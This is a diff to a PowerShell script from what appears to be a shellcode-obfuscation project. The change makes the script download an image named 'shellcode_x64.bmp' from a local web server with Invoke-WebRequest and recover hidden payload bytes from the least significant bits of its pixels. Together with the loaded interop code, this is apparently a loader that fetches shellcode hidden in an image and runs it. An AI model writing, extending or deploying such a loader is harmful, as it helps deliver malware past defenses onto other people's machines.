@@ -2,8 +2,9 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
 
 
-[string] $filename = "C:\Users\Blackberry\Desktop\projects\yet-another-shellcode-obfuscator\samples\helpme_x64.png"
-[Int32] $length = {{ MAX_BITS }}
+$file_uri = "http://127.0.0.1:8000/shellcode_x64.bmp" 
+
+[Int32] $length = 2208
 
 $MethodDefinition =
 @'
@@ -23,7 +24,7 @@ function get_lsb([byte]$target, [byte]$source) {
 
 function get_payload($length) {
     [Int32]$pos = 0
-    $BitMap = [System.Drawing.Image]::FromFile((Get-Item $filename).fullname, $true)
+    $BitMap = [System.Drawing.Image]::FromStream((Invoke-WebRequest -Uri $file_uri).RawContentStream, $true, $true)
     $bytes = New-Object byte[] ($length / 8)
 
     foreach($y in (0..($BitMap.Height-1))) {
